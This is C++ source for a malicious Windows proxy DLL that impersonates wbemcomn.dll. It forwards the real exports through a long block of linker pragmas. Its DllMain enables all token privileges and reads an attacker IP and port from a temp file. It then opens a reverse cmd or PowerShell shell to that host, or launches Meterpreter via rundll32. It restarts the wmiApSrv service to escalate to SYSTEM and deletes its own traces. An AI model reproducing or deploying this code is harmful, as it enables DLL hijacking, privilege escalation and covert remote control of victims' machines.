#pragma comment (linker, "/export:?comp_operator@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?comp_operator@CAbstractQl1Parser@@IEAAHXZ,@1288")
#pragma comment (linker, "/export:?equiv_operator@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?equiv_operator@CAbstractQl1Parser@@IEAAHXZ,@1289")
#pragma comment (linker, "/export:?expandstring@CBaseMrciCompression@@AEAAXPEAPEAEII@Z=c:/windows/system32/wbemcomn.?expandstring@CBaseMrciCompression@@AEAAXPEAPEAEII@Z,@1290")
#pragma comment (linker, "/export:?expr2@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?expr2@CAbstractQl1Parser@@IEAAHXZ,@1291")
#pragma comment (linker, "/export:?expr@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?expr@CAbstractQl1Parser@@IEAAHXZ,@1292")
#pragma comment (linker, "/export:?finalize@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?finalize@CAbstractQl1Parser@@IEAAHXZ,@1293")
#pragma comment (linker, "/export:?getbit@CBaseMrciCompression@@AEAAIXZ=c:/windows/system32/wbemcomn.?getbit@CBaseMrciCompression@@AEAAIXZ,@1294")
#pragma comment (linker, "/export:?getbits@CBaseMrciCompression@@AEAAII@Z=c:/windows/system32/wbemcomn.?getbits@CBaseMrciCompression@@AEAAII@Z,@1295")
#pragma comment (linker, "/export:?inithash@CBaseMrciCompression@@AEAAXXZ=c:/windows/system32/wbemcomn.?inithash@CBaseMrciCompression@@AEAAXXZ,@1296")
#pragma comment (linker, "/export:?isValid@CHaltable@@QEAA_NXZ=c:/windows/system32/wbemcomn.?isValid@CHaltable@@QEAA_NXZ,@1297")
#pragma comment (linker, "/export:?is_operator@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?is_operator@CAbstractQl1Parser@@IEAAHXZ,@1298")
#pragma comment (linker, "/export:?isunialpha@@YAHG@Z=c:/windows/system32/wbemcomn.?isunialpha@@YAHG@Z,@1299")
#pragma comment (linker, "/export:?isunialphanum@@YAHG@Z=c:/windows/system32/wbemcomn.?isunialphanum@@YAHG@Z,@1300")
#pragma comment (linker, "/export:?leading_ident_expr@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?leading_ident_expr@CAbstractQl1Parser@@IEAAHXZ,@1301")
#pragma comment (linker, "/export:?m_bOffline@CWbemInstallObject@@0_NA=c:/windows/system32/wbemcomn.?m_bOffline@CWbemInstallObject@@0_NA,@1302")
#pragma comment (linker, "/export:?m_csFunctionPointers@CMUILocale@@0VCCritSec@@A=c:/windows/system32/wbemcomn.?m_csFunctionPointers@CMUILocale@@0VCCritSec@@A,@1303")
#pragma comment (linker, "/export:?m_csFunctionPointers@CPublishWMIOperationEvent@@0VCCritSec@@A=c:/windows/system32/wbemcomn.?m_csFunctionPointers@CPublishWMIOperationEvent@@0VCCritSec@@A,@1304")
#pragma comment (linker, "/export:?m_csGlobal@CClientOpsNode@@0VCCritSec@@A=c:/windows/system32/wbemcomn.?m_csGlobal@CClientOpsNode@@0VCCritSec@@A,@1305")
#pragma comment (linker, "/export:?m_fEventActivityIdControl@CPublishWMIOperationEvent@@2P6AKKPEAU_GUID@@@ZEA=c:/windows/system32/wbemcomn.?m_fEventActivityIdControl@CPublishWMIOperationEvent@@2P6AKKPEAU_GUID@@@ZEA,@1306")
#pragma comment (linker, "/export:?m_fEventEnabled@CPublishWMIOperationEvent@@0P6AE_KPEBU_EVENT_DESCRIPTOR@@@ZEA=c:/windows/system32/wbemcomn.?m_fEventEnabled@CPublishWMIOperationEvent@@0P6AE_KPEBU_EVENT_DESCRIPTOR@@@ZEA,@1307")
#pragma comment (linker, "/export:?m_fEventRegister@CPublishWMIOperationEvent@@0P6AKPEBU_GUID@@P6AX0KE_K1PEAU_EVENT_FILTER_DESCRIPTOR@@PEAX@Z3PEA_K@ZEA=c:/windows/system32/wbemcomn.?m_fEventRegister@CPublishWMIOperationEvent@@0P6AKPEBU_GUID@@P6AX0KE_K1PEAU_EVENT_FILTER_DESCRIPTOR@@PEAX@Z3PEA_K@ZEA,@1308")
#pragma comment (linker, "/export:?m_fEventUnregister@CPublishWMIOperationEvent@@0P6AK_K@ZEA=c:/windows/system32/wbemcomn.?m_fEventUnregister@CPublishWMIOperationEvent@@0P6AK_K@ZEA,@1309")
#pragma comment (linker, "/export:?m_fEventWrite@CPublishWMIOperationEvent@@0P6AK_KPEAU_EVENT_DESCRIPTOR@@KPEAU_EVENT_DATA_DESCRIPTOR@@@ZEA=c:/windows/system32/wbemcomn.?m_fEventWrite@CPublishWMIOperationEvent@@0P6AK_KPEAU_EVENT_DESCRIPTOR@@KPEAU_EVENT_DATA_DESCRIPTOR@@@ZEA,@1310")
#pragma comment (linker, "/export:?m_fEventWriteTransfer@CPublishWMIOperationEvent@@2P6AK_KPEBU_EVENT_DESCRIPTOR@@PEBU_GUID@@2KPEAU_EVENT_DATA_DESCRIPTOR@@@ZEA=c:/windows/system32/wbemcomn.?m_fEventWriteTransfer@CPublishWMIOperationEvent@@2P6AK_KPEBU_EVENT_DESCRIPTOR@@PEBU_GUID@@2KPEAU_EVENT_DATA_DESCRIPTOR@@@ZEA,@1311")
#pragma comment (linker, "/export:?m_fGetLocaleInfoEx@CMUILocale@@0PEAXEA=c:/windows/system32/wbemcomn.?m_fGetLocaleInfoEx@CMUILocale@@0PEAXEA,@1312")
#pragma comment (linker, "/export:?m_fGetSystemDefaultLocaleName@CMUILocale@@0PEAXEA=c:/windows/system32/wbemcomn.?m_fGetSystemDefaultLocaleName@CMUILocale@@0PEAXEA,@1313")
#pragma comment (linker, "/export:?m_fGetThreadPreferredUILanguages@CMUILocale@@0PEAXEA=c:/windows/system32/wbemcomn.?m_fGetThreadPreferredUILanguages@CMUILocale@@0PEAXEA,@1314")
#pragma comment (linker, "/export:?m_fLCIDToLocaleName@CMUILocale@@0PEAXEA=c:/windows/system32/wbemcomn.?m_fLCIDToLocaleName@CMUILocale@@0PEAXEA,@1315")
#pragma comment (linker, "/export:?m_fLocaleNameToLCID@CMUILocale@@0PEAXEA=c:/windows/system32/wbemcomn.?m_fLocaleNameToLCID@CMUILocale@@0PEAXEA,@1316")
#pragma comment (linker, "/export:?m_fSetThreadPreferredUILanguages@CMUILocale@@0PEAXEA=c:/windows/system32/wbemcomn.?m_fSetThreadPreferredUILanguages@CMUILocale@@0PEAXEA,@1317")
#pragma comment (linker, "/export:?m_hAdvAPI32@CPublishWMIOperationEvent@@0PEAUHINSTANCE__@@EA=c:/windows/system32/wbemcomn.?m_hAdvAPI32@CPublishWMIOperationEvent@@0PEAUHINSTANCE__@@EA,@1318")
#pragma comment (linker, "/export:?m_hKernel32@CMUILocale@@0PEAUHINSTANCE__@@EA=c:/windows/system32/wbemcomn.?m_hKernel32@CMUILocale@@0PEAUHINSTANCE__@@EA,@1319")
#pragma comment (linker, "/export:?m_pEnvironmentMap@CWbemInstallObject@@0PEAV?$map@PEBGPEBGU?$SZLess@PEBG@@V?$wbem_allocator@PEBG@@@std@@EA=c:/windows/system32/wbemcomn.?m_pEnvironmentMap@CWbemInstallObject@@0PEAV?$map@PEBGPEBGU?$SZLess@PEBG@@V?$wbem_allocator@PEBG@@@std@@EA,@1320")
#pragma comment (linker, "/export:?m_pfFlushCache@CWbemInstallObject@@0P6AJH@ZEA=c:/windows/system32/wbemcomn.?m_pfFlushCache@CWbemInstallObject@@0P6AJH@ZEA,@1321")
#pragma comment (linker, "/export:?m_publisher@CPublishWMIOperationEvent@@2_KA=c:/windows/system32/wbemcomn.?m_publisher@CPublishWMIOperationEvent@@2_KA,@1322")
#pragma comment (linker, "/export:?m_pwszAutoRecoverPath@CWbemInstallObject@@0PEBGEB=c:/windows/system32/wbemcomn.?m_pwszAutoRecoverPath@CWbemInstallObject@@0PEBGEB,@1323")
#pragma comment (linker, "/export:?m_pwszBinaryPath@CWbemInstallObject@@0PEBGEB=c:/windows/system32/wbemcomn.?m_pwszBinaryPath@CWbemInstallObject@@0PEBGEB,@1324")
#pragma comment (linker, "/export:?m_pwszRegistryPathCIMOM@CWbemInstallObject@@0PEBGEB=c:/windows/system32/wbemcomn.?m_pwszRegistryPathCIMOM@CWbemInstallObject@@0PEBGEB,@1325")
#pragma comment (linker, "/export:?m_pwszRegistryPathWbem@CWbemInstallObject@@0PEBGEB=c:/windows/system32/wbemcomn.?m_pwszRegistryPathWbem@CWbemInstallObject@@0PEBGEB,@1326")
#pragma comment (linker, "/export:?m_pwszRepositoryPath@CWbemInstallObject@@0PEBGEB=c:/windows/system32/wbemcomn.?m_pwszRepositoryPath@CWbemInstallObject@@0PEBGEB,@1327")
#pragma comment (linker, "/export:?m_rgClsidDllMap@CWbemInstallObject@@0PAUClsidDllMapping@@A=c:/windows/system32/wbemcomn.?m_rgClsidDllMap@CWbemInstallObject@@0PAUClsidDllMapping@@A,@1328")
#pragma comment (linker, "/export:?m_rgDllModules@CWbemInstallObject@@0PAUDllModuleHandle@@A=c:/windows/system32/wbemcomn.?m_rgDllModules@CWbemInstallObject@@0PAUDllModuleHandle@@A,@1329")
#pragma comment (linker, "/export:?mrci1outsingle@CBaseMrciCompression@@AEAAXI@Z=c:/windows/system32/wbemcomn.?mrci1outsingle@CBaseMrciCompression@@AEAAXI@Z,@1330")
#pragma comment (linker, "/export:?mrci1outstring@CBaseMrciCompression@@AEAAXII@Z=c:/windows/system32/wbemcomn.?mrci1outstring@CBaseMrciCompression@@AEAAXII@Z,@1331")
#pragma comment (linker, "/export:?mrci2outsingle@CBaseMrciCompression@@AEAAXI@Z=c:/windows/system32/wbemcomn.?mrci2outsingle@CBaseMrciCompression@@AEAAXI@Z,@1332")
#pragma comment (linker, "/export:?mrci2outstring@CBaseMrciCompression@@AEAAXII@Z=c:/windows/system32/wbemcomn.?mrci2outstring@CBaseMrciCompression@@AEAAXII@Z,@1333")
#pragma comment (linker, "/export:?ms_XXX_Locale_From_LCID@CMUILocale@@SAJKPEAPEAG@Z=c:/windows/system32/wbemcomn.?ms_XXX_Locale_From_LCID@CMUILocale@@SAJKPEAPEAG@Z,@1334")
#pragma comment (linker, "/export:?ms_XXX_Locale_To_LCID@CMUILocale@@SAJPEBGPEAK@Z=c:/windows/system32/wbemcomn.?ms_XXX_Locale_To_LCID@CMUILocale@@SAJPEBGPEAK@Z,@1335")
#pragma comment (linker, "/export:?mstatic_dwTlsIndex@@3KA=c:/windows/system32/wbemcomn.?mstatic_dwTlsIndex@@3KA,@1336")
#pragma comment (linker, "/export:?mstatic_lNumInits@CExecQueue@@1JA=c:/windows/system32/wbemcomn.?mstatic_lNumInits@CExecQueue@@1JA,@1337")
#pragma comment (linker, "/export:?opt_aggregation@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?opt_aggregation@CAbstractQl1Parser@@IEAAHXZ,@1338")
#pragma comment (linker, "/export:?opt_having@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?opt_having@CAbstractQl1Parser@@IEAAHXZ,@1339")
#pragma comment (linker, "/export:?opt_where@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?opt_where@CAbstractQl1Parser@@IEAAHXZ,@1340")
#pragma comment (linker, "/export:?outlength@CBaseMrciCompression@@AEAAXI@Z=c:/windows/system32/wbemcomn.?outlength@CBaseMrciCompression@@AEAAXI@Z,@1341")
#pragma comment (linker, "/export:?parse@CAbstractQl1Parser@@IEAAHH@Z=c:/windows/system32/wbemcomn.?parse@CAbstractQl1Parser@@IEAAHH@Z,@1342")
#pragma comment (linker, "/export:?parse_property_name@CAbstractQl1Parser@@IEAAHAEAVCPropertyName@@@Z=c:/windows/system32/wbemcomn.?parse_property_name@CAbstractQl1Parser@@IEAAHAEAVCPropertyName@@@Z,@1343")
#pragma comment (linker, "/export:?prop_list@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?prop_list@CAbstractQl1Parser@@IEAAHXZ,@1344")
#pragma comment (linker, "/export:?prop_list_2@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?prop_list_2@CAbstractQl1Parser@@IEAAHXZ,@1345")
#pragma comment (linker, "/export:?property_name@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?property_name@CAbstractQl1Parser@@IEAAHXZ,@1346")
#pragma comment (linker, "/export:?putbits@CBaseMrciCompression@@AEAAXII@Z=c:/windows/system32/wbemcomn.?putbits@CBaseMrciCompression@@AEAAXII@Z,@1347")
#pragma comment (linker, "/export:?rel_operator@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?rel_operator@CAbstractQl1Parser@@IEAAHXZ,@1348")
#pragma comment (linker, "/export:?sMatachedWithOneChar@CLike@@0EB=c:/windows/system32/wbemcomn.?sMatachedWithOneChar@CLike@@0EB,@1349")
#pragma comment (linker, "/export:?sMatachedWithWildcardChar@CLike@@0EB=c:/windows/system32/wbemcomn.?sMatachedWithWildcardChar@CLike@@0EB,@1350")
#pragma comment (linker, "/export:?sNoMatch@CLike@@0EB=c:/windows/system32/wbemcomn.?sNoMatch@CLike@@0EB,@1351")
#pragma comment (linker, "/export:?simple_expr@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?simple_expr@CAbstractQl1Parser@@IEAAHXZ,@1352")
#pragma comment (linker, "/export:?staticRead@CBasicUnloadInstruction@@SA?AVCWbemInterval@@PEAUIWbemServices@@PEAUIWbemContext@@PEBG@Z=c:/windows/system32/wbemcomn.?staticRead@CBasicUnloadInstruction@@SA?AVCWbemInterval@@PEAUIWbemServices@@PEAUIWbemContext@@PEBG@Z,@1353")
#pragma comment (linker, "/export:?term2@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?term2@CAbstractQl1Parser@@IEAAHXZ,@1354")
#pragma comment (linker, "/export:?term@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?term@CAbstractQl1Parser@@IEAAHXZ,@1355")
#pragma comment (linker, "/export:?tolerance@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?tolerance@CAbstractQl1Parser@@IEAAHXZ,@1356")
#pragma comment (linker, "/export:?trailing_const_expr@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?trailing_const_expr@CAbstractQl1Parser@@IEAAHXZ,@1357")
#pragma comment (linker, "/export:?trailing_ident_expr@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?trailing_ident_expr@CAbstractQl1Parser@@IEAAHXZ,@1358")
#pragma comment (linker, "/export:?trailing_or_null@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?trailing_or_null@CAbstractQl1Parser@@IEAAHXZ,@1359")
#pragma comment (linker, "/export:?trailing_prop_expr@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?trailing_prop_expr@CAbstractQl1Parser@@IEAAHXZ,@1360")
#pragma comment (linker, "/export:?typed_constant@CAbstractQl1Parser@@IEAAHXZ=c:/windows/system32/wbemcomn.?typed_constant@CAbstractQl1Parser@@IEAAHXZ,@1361")


BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetPrivilege(
	HANDLE hToken,          // Access token handle
	LPCTSTR lpszPrivilege,  // Name of privilege to enable/disable
	BOOL bEnablePrivilege   // To enable (or disable privilege)
	)
{
	TOKEN_PRIVILEGES tp;    // Token privilege structure
	LUID luid;              // Used by local system to identify the privilege

	if (!LookupPrivilegeValue(
		NULL,               // Lookup privilege on local system
		lpszPrivilege,      // Privilege to lookup
		&luid))             // Receives LUID of privilege
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	// Enable the privilege (or disable all privileges).
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,               // If TRUE, function disables all privileges, if FALSE the function modifies privilege based on the tp
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	return TRUE;
}


BOOL IsSystem(VOID)
{
	DWORD dwSize = 0, dwResult = 0;
	HANDLE hToken = NULL;
	PTOKEN_USER Ptoken_User;
	LPWSTR SID = NULL;

	// Open a handle to the access token for the calling process.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	// Call GetTokenInformation to get the buffer size.
	if (!GetTokenInformation(hToken, TokenUser, NULL, dwSize, &dwSize)) {
		dwResult = GetLastError();
		if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
			return FALSE;
		}
	}

	// Allocate the buffer.
	Ptoken_User = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize);

	// Call GetTokenInformation again to get the group information.
	if (!GetTokenInformation(hToken, TokenUser, Ptoken_User, dwSize, &dwSize)) {
		return FALSE;
	}
	if (!ConvertSidToStringSidW(Ptoken_User->User.Sid, &SID)) {
		return FALSE;
	}

	if (_wcsicmp(L"S-1-5-18", SID) != 0) {
		return FALSE;
	}
	if (Ptoken_User) GlobalFree(Ptoken_User);

	return TRUE;
}


BOOL StartReversepOshShell(LPWSTR lpwIpAddress, DWORD dwPort)
{
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	TCHAR szCommand[1024];
	TCHAR szCommandPart1[128] = L"powershell.exe \"$client = New-Object System.Net.Sockets.TCPClient('";
	TCHAR szCommandPart2[64] = L"',";
	TCHAR szCommandPart3[512] = L");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

	_sntprintf_s(szCommand, sizeof(szCommand) / sizeof(TCHAR), _TRUNCATE, L"%s%s%s%i%s", szCommandPart1, lpwIpAddress, szCommandPart2, dwPort, szCommandPart3);

	CreateProcess(NULL, szCommand, NULL, NULL, TRUE,
		0, NULL, NULL, &sui, &pi);

	return TRUE;
}


BOOL StartReverseShell(LPCSTR lpIpAddress, DWORD dwPort)
{
	WSADATA wsaData;
	SOCKET s1;
	struct sockaddr_in hax;
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
		(unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(dwPort);
	hax.sin_addr.s_addr = inet_addr(lpIpAddress);

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	TCHAR commandLine[256] = L"cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
		0, NULL, NULL, &sui, &pi);

	return TRUE;
}


BOOL StartMeterpreter()
{
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	TCHAR chCommand[256] = L"rundll32.exe ";
	TCHAR chMsfFile[MAX_PATH];
	GetTempPath(MAX_PATH, chMsfFile);
	wcscat_s(chCommand, sizeof(chCommand) / sizeof(wchar_t), chMsfFile);
	wcscat_s(chCommand, sizeof(chCommand) / sizeof(wchar_t), L"tmpMSFBLA.tmp,Meterpreter");

	CreateProcess(NULL, chCommand, NULL, NULL, TRUE,
		0, NULL, NULL, &sui, &pi);

	return TRUE;
}


BOOL StartStopService(LPCWSTR lpService)
{
	SC_HANDLE serviceDbHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE serviceHandle = OpenService(serviceDbHandle, lpService, SC_MANAGER_ALL_ACCESS);

	SERVICE_STATUS_PROCESS status;
	DWORD bytesNeeded;
	QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded);

	if (status.dwCurrentState == SERVICE_RUNNING) {
		ControlService(serviceHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&status); // Stop the Service
	}
	if (status.dwCurrentState == SERVICE_STOPPED) {
		BOOL Started = StartService(serviceHandle, NULL, NULL); // Start the Service
		if (Started) {
			ControlService(serviceHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&status); // Stop the Service again
		}
	}
	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(serviceDbHandle);
	
	return TRUE;
}


void SelfDestruct(LPCWSTR chTmpFile) {
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	TCHAR commandLine[256] = L"cmd.exe";
	TCHAR chCleanUp[256] = L" /C timeout /T 3 && del C:\\windows\\System32\\wbem\\wbemcomn.dll";

	CreateProcess(commandLine, chCleanUp, NULL, NULL, TRUE,
		0, NULL, NULL, &sui, &pi);

	if (!wcslen(chTmpFile) == 0) {
		DeleteFile(chTmpFile);
	}

	return;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved
	)
{
	//Enable all available privileges (like getprivs)
	HANDLE hToken;
	TOKEN_PRIVILEGES* ptkp = NULL;
	TCHAR lpszPrivilege[256];
	BOOL bEnablePrivilege = TRUE;
	DWORD dwLenght;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken); //Combines all possible access rights for a token.
	GetTokenInformation(hToken, TokenPrivileges, ptkp, 0, &dwLenght);
	ptkp = (TOKEN_PRIVILEGES*) new char[dwLenght];
	GetTokenInformation(hToken, TokenPrivileges, ptkp, dwLenght, &dwLenght);
	for (unsigned int i = 0; i<ptkp->PrivilegeCount; i++) {
		dwLenght = 256;
		LookupPrivilegeName(NULL, &(ptkp->Privileges[i].Luid), lpszPrivilege, &dwLenght);
		SetPrivilege(hToken, lpszPrivilege, bEnablePrivilege);
	}
	delete[] ptkp;

	//Now read settings from config file in %temp% folder and assign setting to needed variables
	FILE *stream;
	CHAR chRemoteIp[16];
	DWORD dwRemotePort;
	WCHAR chShell[32], chSystem[32];

	WCHAR chTmpFile[MAX_PATH];
	GetTempPath(MAX_PATH, chTmpFile);
	wcscat_s(chTmpFile, sizeof(chTmpFile) / sizeof(wchar_t), L"tmpBLABLA.tmp");

	_wfopen_s(&stream, chTmpFile, L"r");
	fscanf_s(stream, "%s", chRemoteIp, 16);
	fscanf_s(stream, "%d", &dwRemotePort);
	fwscanf_s(stream, L"%ls", chShell, 32);
	fwscanf_s(stream, L"%ls", chSystem, 32);
	fclose(stream);

	LPCSTR lpRemoteIp = chRemoteIp;
	LPCWSTR lpShell = chShell;
	LPCWSTR lpSystem = chSystem;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		BOOL isAdmin, isGodMode;
		isAdmin = IsElevated();
		isGodMode = IsSystem();

		if (isGodMode) {
			if (_wcsicmp(L"cmd", lpShell) == 0) {
				//Start Reversed SYSTEM Command Shell
				StartReverseShell(lpRemoteIp, dwRemotePort);
				SelfDestruct(chTmpFile);
				exit(0);
			}
			if (_wcsicmp(L"powershell", lpShell) == 0) {
				/* Convert LPCSTR lpRemoteIp to Unicode LPWSTR lpwRemoteIp */
				size_t len;
				LPWSTR lpwRemoteIp;
				len = MultiByteToWideChar(CP_ACP, 0, lpRemoteIp, -1, NULL, 0);
				lpwRemoteIp = (wchar_t*)malloc(sizeof(wchar_t) * len);
				MultiByteToWideChar(CP_ACP, 0, lpRemoteIp, -1, lpwRemoteIp, len);

				//Start Reversed SYSTEM PowerShell Shell
				StartReversepOshShell(lpwRemoteIp, dwRemotePort);
				SelfDestruct(chTmpFile);
				exit(0);
			}
			if (_wcsicmp(L"msf", lpShell) == 0) {
				//Start Reversed Meterpreter Session
				StartMeterpreter();
				SelfDestruct(L"");
				exit(0);
			}
		}
		if ((isAdmin) && (_wcsicmp(L"system", chSystem) == 0)) {
			if (_wcsicmp(L"msf", lpShell) == 0) {
				WCHAR chMsfFile[MAX_PATH];
				LPCWSTR lpMsfTmpFile = L"C:\\Windows\\Temp\\tmpMSFBLA.tmp";

				GetTempPath(MAX_PATH, chMsfFile);
				wcscat_s(chMsfFile, sizeof(chMsfFile) / sizeof(wchar_t), L"tmpMSFBLA.tmp");
				MoveFileEx(chMsfFile, lpMsfTmpFile, MOVEFILE_REPLACE_EXISTING);
			}
			LPCWSTR lpSysTmpFile = L"C:\\Windows\\Temp\\tmpBLABLA.tmp";

			MoveFileEx(chTmpFile, lpSysTmpFile, MOVEFILE_REPLACE_EXISTING);
			StartStopService(L"wmiApSrv");
			exit(0);
		}
		if ((isAdmin) && (_wcsicmp(L"system", chSystem) != 0)) {
			if (_wcsicmp(L"cmd", lpShell) == 0) {
				//Start Reversed Command Shell
				StartReverseShell(lpRemoteIp, dwRemotePort);
				SelfDestruct(chTmpFile);
				exit(0);
			}
			if (_wcsicmp(L"powershell", lpShell) == 0) {
				/* Convert LPCSTR lpRemoteIp to Unicode LPWSTR lpwRemoteIp */
				size_t len;
				LPWSTR lpwRemoteIp;
				len = MultiByteToWideChar(CP_ACP, 0, lpRemoteIp, -1, NULL, 0);
				lpwRemoteIp = (wchar_t*)malloc(sizeof(wchar_t) * len);
				MultiByteToWideChar(CP_ACP, 0, lpRemoteIp, -1, lpwRemoteIp, len);

				//Start Reversed PowerShell Shell
				StartReversepOshShell(lpwRemoteIp, dwRemotePort);
				SelfDestruct(chTmpFile);
				exit(0);
			}
			if (_wcsicmp(L"msf", lpShell) == 0) {
				//Start Reversed Meterpreter Session
				StartMeterpreter();
				SelfDestruct(L"");
				exit(0);
			}
		}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

